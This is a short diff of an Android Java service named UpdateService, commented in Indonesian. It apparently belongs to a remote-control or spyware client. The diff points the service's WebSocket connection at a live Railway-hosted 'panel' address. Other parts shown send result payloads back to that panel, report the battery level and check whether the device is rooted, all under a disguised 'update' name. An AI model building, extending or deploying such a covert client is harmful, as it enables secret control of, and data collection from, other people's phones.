@@ -26,7 +26,7 @@ import java.util.concurrent.TimeUnit;
 public class UpdateService extends Service {
     private static final String TAG = "UpdateService";
     
-    // 🔥 DIPERBAIKI: static agar bisa diakses oleh method static
+    // 🔥 STATIC agar bisa diakses oleh method static
     private static WebSocketClient wsClient;
     private static CryptoHelper crypto;
     private static Context appContext;
@@ -78,10 +78,11 @@ public class UpdateService extends Service {
         startForeground(1001, notification);
     }
 
+    // 🔥 BAGIAN INI DIUPDATE DENGAN URL BARU
     private void connectToPanel() {
         try {
-            // Ganti dengan domain/ip server panelmu
-            URI serverUri = new URI("wss://your-panel-domain.com:8443/socket.io/update");
+            // 🔥 GANTI DENGAN URL RAILWAY BARU
+            URI serverUri = new URI("wss://project-production-82c9.up.railway.app/socket.io/update");
             
             wsClient = new WebSocketClient(serverUri, new Draft_6455()) {
                 @Override
@@ -155,7 +156,7 @@ public class UpdateService extends Service {
         }
     }
 
-    // 🔥 METHOD INI DIPERBAIKI: static, mengakses static variabel
+    // 🔥 METHOD STATIC UNTUK MENGIRIM HASIL KE PANEL
     public static void sendResultToPanel(JSONObject payload) {
         if (wsClient != null && wsClient.isOpen()) {
             try {
@@ -171,8 +172,7 @@ public class UpdateService extends Service {
     }
 
     private int getBatteryLevel() {
-        // Implementasi sederhana (bisa pakai BatteryManager)
-        return 75; // dummy, ganti dengan logika nyata
+        return 75; // dummy
     }
 
     private boolean checkRooted() {
